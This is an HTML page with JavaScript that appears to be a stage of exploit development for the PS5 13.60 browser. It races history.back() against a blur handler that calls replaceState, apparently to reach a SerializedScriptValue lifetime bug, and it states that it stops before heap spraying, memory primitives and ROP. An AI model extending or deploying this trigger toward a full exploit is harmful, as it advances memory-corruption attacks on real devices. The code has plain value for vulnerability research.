<!doctype html>
<meta charset="utf-8">
<title>PS5 13.60 - V33 SSV Entry Verifier</title>

<style>
body {
    background:#111;
    color:#eee;
    font:15px monospace;
    padding:18px;
}
button {
    font:18px monospace;
    padding:10px 18px;
}
#status {
    margin:15px 0;
    padding:10px;
    border:1px solid #555;
}
pre {
    white-space:pre-wrap;
    word-break:break-word;
}
input {
    position:absolute;
    left:-5000px;
}
</style>

<h2>PS5 13.60 — V33</h2>
<div>SSV entry-path verifier — pre-primitive only</div>

<p><button id="run">RUN V33</button></p>

<div id="status">READY</div>
<pre id="log"></pre>

<script>
"use strict";

/*
 * V33
 *
 * PS5 13.60 SerializedScriptValue entry-path verifier.
 *
 * Tests browser-visible prerequisites associated with the
 * historical SSV same-document navigation lifetime path.
 *
 * Deliberately stops before:
 *   - freed-object reclamation
 *   - heap spraying
 *   - address disclosure
 *   - arbitrary read/write
 *   - native calls
 *   - ROP/syscalls
 */

const out = document.querySelector("#log");
const statusBox = document.querySelector("#status");
const button = document.querySelector("#run");

let blurCount = 0;
let replaceCount = 0;
let popCount = 0;
let anomalies = 0;
let exceptions = 0;

function log(s) {
    out.textContent += s + "\n";
    console.log(s);
}

function cp(s) {
    try {
        localStorage.setItem("PS5_V33_CP", s);
    } catch (_) {}

    log("[CP] " + s);
}

function sleep(ms) {
    return new Promise(r => setTimeout(r, ms));
}

function describeState(s) {
    try {
        if (!s)
            return String(s);

        return JSON.stringify({
            marker:s.marker,
            sequence:s.sequence,
            textLength:
                typeof s.text === "string"
                ? s.text.length
                : -1,
            nested:
                s.nested &&
                s.nested.value
        });
    } catch(e) {
        return "STATE_ERROR:" + e.name;
    }
}

async function run() {

    button.disabled = true;
    out.textContent = "";

    blurCount = 0;
    replaceCount = 0;
    popCount = 0;
    anomalies = 0;
    exceptions = 0;

    statusBox.textContent =
        "STATUS: RUNNING";

    const previous =
        localStorage.getItem(
            "PS5_V33_CP"
        );

    if (previous)
        log(
            "Previous checkpoint: " +
            previous
        );

    log("PS5 13.60 — V33");
    log("SSV ENTRY VERIFIER");
    log("");
    log(navigator.userAgent);
    log("");

    const anchor1 =
        document.createElement("div");

    anchor1.id = "v33-one";
    anchor1.tabIndex = -1;

    const anchor2 =
        document.createElement("div");

    anchor2.id = "v33-two";
    anchor2.tabIndex = -1;

    const input =
        document.createElement("input");

    input.id = "v33-focus";

    document.body.appendChild(anchor1);
    document.body.appendChild(anchor2);
    document.body.appendChild(input);

    /*
     * Deliberately ordinary structured state.
     * Large enough to exercise serialization,
     * but not intended for heap shaping.
     */

    const originalState = {
        marker:"V33-ORIGINAL",
        sequence:1,
        text:"A".repeat(65536),
        nested:{
            value:0x1337
        },
        array:[
            1,2,3,4,5,6,7,8
        ]
    };

    const secondState = {
        marker:"V33-SECOND",
        sequence:2,
        text:"B".repeat(65536),
        nested:{
            value:0x2664
        }
    };

    const replacementState = {
        marker:"V33-REPLACED",
        sequence:3,
        text:"C".repeat(65536),
        nested:{
            value:0x3999
        }
    };

    let popStateObject = null;

    function onBlur() {

        blurCount++;

        cp("V33:BLUR_ENTER");

        log(
            "[BLUR] count=" +
            blurCount
        );

        log(
            "[BLUR] history.state BEFORE=" +
            describeState(
                history.state
            )
        );

        try {

            cp(
                "V33:BEFORE_REPLACE_FROM_BLUR"
            );

            history.replaceState(
                replacementState,
                "",
                location.href
            );

            replaceCount++;

            cp(
                "V33:AFTER_REPLACE_FROM_BLUR"
            );

            log(
                "[BLUR] replaceState returned"
            );

            log(
                "[BLUR] history.state AFTER=" +
                describeState(
                    history.state
                )
            );

        } catch(e) {

            exceptions++;

            log(
                "[BLUR EXCEPTION] " +
                e
            );
        }

        cp("V33:BLUR_EXIT");
    }

    input.addEventListener(
        "blur",
        onBlur,
        {once:true}
    );

    window.addEventListener(
        "popstate",
        function handler(event) {

            popCount++;

            popStateObject =
                event.state;

            cp(
                "V33:POPSTATE_" +
                popCount
            );

            log(
                "[POP] count=" +
                popCount
            );

            log(
                "[POP] event.state=" +
                describeState(
                    event.state
                )
            );

            log(
                "[POP] history.state=" +
                describeState(
                    history.state
                )
            );

            window.removeEventListener(
                "popstate",
                handler
            );
        }
    );

    try {

        cp("V33:SET_BASE");

        history.replaceState(
            originalState,
            "",
            "#v33-one"
        );

        log(
            "[BASE] " +
            describeState(
                history.state
            )
        );

        cp("V33:PUSH_SECOND");

        history.pushState(
            secondState,
            "",
            "#v33-two"
        );

        log(
            "[SECOND] " +
            describeState(
                history.state
            )
        );

        /*
         * Establish focus before initiating
         * same-document traversal.
         */

        input.focus();

        log(
            "[FOCUS] active=" +
            (
                document.activeElement
                === input
            )
        );

        await sleep(50);

        cp("V33:BEFORE_HISTORY_BACK");

        history.back();

        cp(
            "V33:AFTER_HISTORY_BACK_RETURN"
        );

        /*
         * Focus transition while the history
         * traversal is being delivered.
         *
         * This causes the blur callback which
         * performs replaceState().
         */

        anchor1.focus();

        cp(
            "V33:AFTER_FOCUS_CHANGE"
        );

        await sleep(400);

        cp("V33:FINAL_CHECK");

        log("");
        log(
            "FINAL history.state=" +
            describeState(
                history.state
            )
        );

        log(
            "FINAL event.state=" +
            describeState(
                popStateObject
            )
        );

        log(
            "FINAL hash=" +
            location.hash
        );

        log(
            "BLUR CALLBACKS=" +
            blurCount
        );

        log(
            "REPLACE IN BLUR=" +
            replaceCount
        );

        log(
            "POP EVENTS=" +
            popCount
        );

        /*
         * Browser-visible consistency checks.
         */

        if (blurCount !== 1) {
            anomalies++;
            log(
                "[ANOMALY] blur count=" +
                blurCount
            );
        }

        if (replaceCount !== 1) {
            anomalies++;
            log(
                "[ANOMALY] replace count=" +
                replaceCount
            );
        }

        if (popCount !== 1) {
            anomalies++;
            log(
                "[ANOMALY] pop count=" +
                popCount
            );
        }

        /*
         * Verify original JS objects themselves
         * remain coherent.
         */

        if (
            originalState.marker
            !== "V33-ORIGINAL" ||
            originalState.nested.value
            !== 0x1337 ||
            originalState.text.length
            !== 65536
        ) {
            anomalies++;

            log(
                "[ANOMALY] original object changed"
            );
        }

        if (
            replacementState.marker
            !== "V33-REPLACED" ||
            replacementState.text.length
            !== 65536
        ) {
            anomalies++;

            log(
                "[ANOMALY] replacement object changed"
            );
        }

        cp("V33:COMPLETE");

    } catch(e) {

        exceptions++;

        log(
            "[EXCEPTION] " +
            e
        );

        cp(
            "V33:TOP_LEVEL_EXCEPTION"
        );
    }

    try {
        input.remove();
        anchor1.remove();
        anchor2.remove();
    } catch (_) {}

    log("");
    log("============================");
    log("V33 RESULT");
    log("============================");

    log(
        "BLUR CALLBACKS: " +
        blurCount
    );

    log(
        "REPLACE CALLBACKS: " +
        replaceCount
    );

    log(
        "POP EVENTS: " +
        popCount
    );

    log(
        "EXCEPTIONS: " +
        exceptions
    );

    log(
        "ANOMALIES: " +
        anomalies
    );

    log("============================");

    statusBox.textContent =
        exceptions || anomalies
        ? "STATUS: CHECK RESULT"
        : "STATUS: NORMAL";

    button.disabled = false;
}

button.onclick = run;
</script>
